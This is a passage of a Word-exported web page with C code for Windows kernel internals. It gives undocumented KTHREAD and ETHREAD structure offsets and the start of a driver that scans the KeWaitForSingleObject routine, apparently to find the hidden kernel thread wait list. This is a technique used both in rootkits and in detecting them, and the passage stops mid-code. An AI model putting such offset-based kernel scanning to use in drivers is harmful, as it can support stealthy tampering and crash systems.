<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*057*/
BYTE<span style="mso-spacerun: yes">                      </span>WaitReason;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*058*/
PLIST_ENTRY<span style="mso-spacerun: yes">               </span>WaitBlockList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*05C*/
LIST_ENTRY<span style="mso-spacerun: yes">                </span>WaitListEntry;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*064*/
DWORD<span style="mso-spacerun: yes">                     </span>WaitTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*068*/
BYTE<span style="mso-spacerun: yes">                      </span>BasePriority;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*069*/
BYTE<span style="mso-spacerun: yes">                     
</span>DecrementCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06A*/
BYTE<span style="mso-spacerun: yes">                     
</span>PriorityDecrement;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06B*/
BYTE<span style="mso-spacerun: yes">                      </span>Quantum;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*06C*/
KWAIT_BLOCK<span style="mso-spacerun: yes">               </span>WaitBlock [4];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0CC*/
DWORD<span style="mso-spacerun: yes">                     </span>LegoData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0D0*/
DWORD<span style="mso-spacerun: yes">                    
</span>KernelApcDisable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0D4*/
KAFFINITY<span style="mso-spacerun: yes">                 </span>UserAffinity;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0D8*/
BOOLEAN<span style="mso-spacerun: yes">              </span><span
style="mso-spacerun: yes">     </span>SystemAffinityActive;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0D9*/
BYTE<span style="mso-spacerun: yes">                      </span>Pad [3];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0DC*/
struct SERVICE_DESCRIPTOR_TABLE *pServiceDescriptorTable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0E0*/
PVOID<span style="mso-spacerun: yes">                     </span>Queue;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0E4*/
PVOID<span style="mso-spacerun: yes">                     </span>ApcQueueLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*0E8*/
KTIMER<span style="mso-spacerun: yes">                 </span><span
style="mso-spacerun: yes">   </span>Timer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*110*/
LIST_ENTRY<span style="mso-spacerun: yes">               
</span>QueueListEntry;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*118*/
KAFFINITY<span style="mso-spacerun: yes">                 </span>Affinity;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*11C*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>Preempted;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*11D*/
BOOLEAN<span style="mso-spacerun: yes">                  
</span>ProcessReadyQueue;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*11E*/
BOOLEAN<span style="mso-spacerun: yes">                  
</span>KernelStackResident;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*11F*/
BYTE<span style="mso-spacerun: yes">                      </span>NextProcessor;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*120*/
PVOID<span style="mso-spacerun: yes">                     </span>CallbackStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*124*/
struct _WIN32_THREAD<span style="mso-spacerun: yes">     </span>*Win32Thread;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*128*/
PVOID<span style="mso-spacerun: yes">                     </span>TrapFrame;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*12C*/
struct KAPC_STATE<span style="mso-spacerun: yes">              
</span>*ApcStatePointer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*130*/
PVOID<span style="mso-spacerun: yes">                     </span>p130;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*134*/
BOOLEAN<span style="mso-spacerun: yes">                  
</span>EnableStackSwap;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*135*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>LargeStack;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*136*/
BYTE<span style="mso-spacerun: yes">                      </span>ResourceIndex;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*137*/
KPROCESSOR_MODE<span style="mso-spacerun: yes">           </span>PreviousMode;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*138*/
DWORD<span style="mso-spacerun: yes">                </span><span
style="mso-spacerun: yes">     </span>KernelTime; // ticks<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*13C*/
DWORD<span style="mso-spacerun: yes">                     </span>UserTime;<span
style="mso-spacerun: yes">   </span>// ticks<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*140*/
struct KAPC_STATE<span style="mso-spacerun: yes">               
</span>SavedApcState;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*158*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>Alertable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*159*/
BYTE<span style="mso-spacerun: yes">                      </span>ApcStateIndex;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*15A*/
BOOLEAN<span style="mso-spacerun: yes">          </span><span
style="mso-spacerun: yes">         </span>ApcQueueable;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*15B*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>AutoAlignment;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*15C*/
PVOID<span style="mso-spacerun: yes">                     </span>StackBase;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*160*/
KAPC<span style="mso-spacerun: yes">                      </span>SuspendApc;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*190*/
KSEMAPHORE<span style="mso-spacerun: yes">               
</span>SuspendSemaphore;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1A4*/
LIST_ENTRY<span style="mso-spacerun: yes">                </span>ThreadListEntry;<span
style="mso-spacerun: yes">  </span>// see KPROCESS<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AC*/
BYTE<span style="mso-spacerun: yes">                      </span>FreezeCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AD*/
BYTE<span style="mso-spacerun: yes">                      </span>SuspendCount;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AE*/
BYTE<span style="mso-spacerun: yes">                     
</span>IdealProcessor;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1AF*/
BOOLEAN<span style="mso-spacerun: yes">                   </span>DisableBoost;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B0*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
ETHREAD<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*000*/
struct KTHREAD<span style="mso-spacerun: yes">    </span>Tcb;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B0*/
LARGE_INTEGER CreateTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B8*/
union<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B8*/<span
style="mso-spacerun: yes">     </span>LARGE_INTEGER ExitTime;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1B8*/<span
style="mso-spacerun: yes">     </span>LIST_ENTRY<span style="mso-spacerun:
yes">    </span>LpcReplyChain;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C0*/
union<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C0*/<span
style="mso-spacerun: yes">     </span>NTSTATUS<span style="mso-spacerun:
yes">      </span>ExitStatus;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C0*/<span
style="mso-spacerun: yes">     </span>DWORD<span style="mso-spacerun:
yes">         </span>OfsChain;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1C4*/
LIST_ENTRY<span style="mso-spacerun: yes">    </span>PostBlockList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1CC*/
LIST_ENTRY<span style="mso-spacerun: yes">    </span>TerminationPortList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1D4*/
PVOID<span style="mso-spacerun: yes">         </span>ActiveTimerListLock;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1D8*/
LIST_ENTRY<span style="mso-spacerun: yes">    </span>ActiveTimerListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1E0*/
CLIENT_ID<span style="mso-spacerun: yes">     </span>Cid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1E8*/
KSEMAPHORE<span style="mso-spacerun: yes">    </span>LpcReplySemaphore;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*1FC*/
DWORD<span style="mso-spacerun: yes">         </span>LpcReplyMessage;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*200*/
DWORD<span style="mso-spacerun: yes">         </span>LpcReplyMessageId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*204*/
DWORD<span style="mso-spacerun: yes">         </span>PerformanceCountLow;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*208*/
DWORD<span style="mso-spacerun: yes">         </span>ImpersonationInfo;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*20C*/
LIST_ENTRY<span style="mso-spacerun: yes">    </span>IrpList;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*214*/
PVOID<span style="mso-spacerun: yes">         </span>TopLevelIrp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*218*/
PVOID<span style="mso-spacerun: yes">         </span>DeviceToVerify;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*21C*/
DWORD<span style="mso-spacerun: yes">         </span>ReadClusterSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*220*/
BOOLEAN<span style="mso-spacerun: yes">       </span>ForwardClusterOnly;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*221*/
BOOLEAN<span style="mso-spacerun: yes">      
</span>DisablePageFaultClustering;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*222*/
BOOLEAN<span style="mso-spacerun: yes">       </span>DeadThread;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*223*/
BOOLEAN<span style="mso-spacerun: yes">       </span>Reserved;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*224*/
BOOL<span style="mso-spacerun: yes">          </span>HasTerminated;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*228*/
ACCESS_MASK<span style="mso-spacerun: yes">   </span>GrantedAccess;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*22C*/
PEPROCESS<span style="mso-spacerun: yes">     </span>ThreadsProcess;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*230*/
PVOID<span style="mso-spacerun: yes">         </span>StartAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*234*/
union<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*234*/<span
style="mso-spacerun: yes">     </span>PVOID<span style="mso-spacerun:
yes">         </span>Win32StartAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*234*/<span
style="mso-spacerun: yes">     </span>DWORD<span style="mso-spacerun:
yes">         </span>LpcReceivedMessageId;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><span
style="mso-spacerun: yes">            </span>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*238*/
BOOLEAN<span style="mso-spacerun: yes">       </span>LpcExitThreadCalled;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*239*/
BOOLEAN<span style="mso-spacerun: yes">       </span>HardErrorsAreDisabled;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*23A*/
BOOLEAN<span style="mso-spacerun: yes">       </span>LpcReceivedMsgIdValid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*23B*/
BOOLEAN<span style="mso-spacerun: yes">       </span>ActiveImpersonationInfo;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*23C*/
DWORD<span style="mso-spacerun: yes">         </span>PerformanceCountHigh;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*240*/
DWORD<span style="mso-spacerun: yes">         </span>d240;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*244*/
DWORD<span style="mso-spacerun: yes">         </span>d244;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>/*248*/
};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
long val,i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
ETHREAD *pethread;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *)KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
